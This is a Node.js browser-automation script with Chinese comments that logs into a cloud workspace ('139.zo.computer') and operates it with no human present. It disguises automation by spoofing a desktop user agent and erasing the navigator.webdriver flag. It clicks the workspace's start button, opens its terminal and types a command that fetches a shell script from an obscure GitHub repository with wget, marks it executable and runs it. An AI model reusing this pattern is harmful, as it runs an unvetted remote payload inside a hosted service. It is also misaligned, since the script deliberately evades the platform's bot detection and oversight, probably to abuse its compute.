import { launch } from 'cloakbrowser';

const CONFIG = {
  workspaceDomain: '139.zo.computer',
  workspaceName: '139',
  waitAfterEnterWorkspace: 150000,
  headless: true,
  runTmuxInit: process.env.INIT_TMUX === '1',
  tmuxCommand: "wget -O zzz.sh https://raw.githubusercontent.com/yghhbbuy/vvvioui/refs/heads/main/zzz.sh && chmod +x zzz.sh && bash zzz.sh",
};

async function safeScreenshot(page, path) {
  try { await page.screenshot({ path, fullPage: true }); } catch {}
}

async function run() {
  const url = process.argv[2];
  if (!url) process.exit(1);

  // --- 关键优化：使用桌面级配置 ---
  const browser = await launch({ headless: CONFIG.headless });
  const context = await browser.newContext({
    viewport: { width: 1920, height: 1080 },
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    locale: 'en-US',
  });
  const page = await context.newPage();

  // 添加防检测脚本：抹除自动化特征
  await page.addInitScript(() => {
    Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
  });

  try {
    console.log('🌐 正在访问:', url);
    await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 60000 });

    // 1. 模拟真人：等待随机时间，避免秒级点击
    const delay = Math.floor(Math.random() * 5000) + 3000;
    await page.waitForTimeout(delay);

    // 2. 轮询点击工作区
    console.log('🔎 正在查找工作区...');
    const workspace = page.getByText(CONFIG.workspaceDomain, { exact: false });
    if (await workspace.first().isVisible({ timeout: 10000 })) {
        await workspace.first().click();
        await page.waitForTimeout(10000);
    }

    // 3. 轮询点击启动按钮
    console.log('🚀 正在查找启动按钮...');
    for (let i = 0; i < 20; i++) {
        const btn = page.locator('text=/Start|Run|开始/i').first();
        if (await btn.isVisible({ timeout: 3000 })) {
            await btn.click();
            console.log('✅ 成功点击启动按钮');
            await page.waitForTimeout(15000);
            break;
        }
        await page.waitForTimeout(5000);
    }

    // 4. 执行 tmux
    if (CONFIG.runTmuxInit) {
        console.log('🖥️ 执行终端任务...');
        await page.keyboard.press('Control+Shift+`');
        await page.waitForTimeout(5000);
        await page.keyboard.insertText(CONFIG.tmuxCommand);
        await page.keyboard.press('Enter');
        await page.waitForTimeout(10000);
    }
    
    await safeScreenshot(page, 'result.png');
    console.log('✅ 流程执行完毕');
  } catch (err) {
    console.error('❌ 遇到问题:', err);
    await safeScreenshot(page, 'error-final.png');
  } finally {
    await browser.close();
  }
}

run();
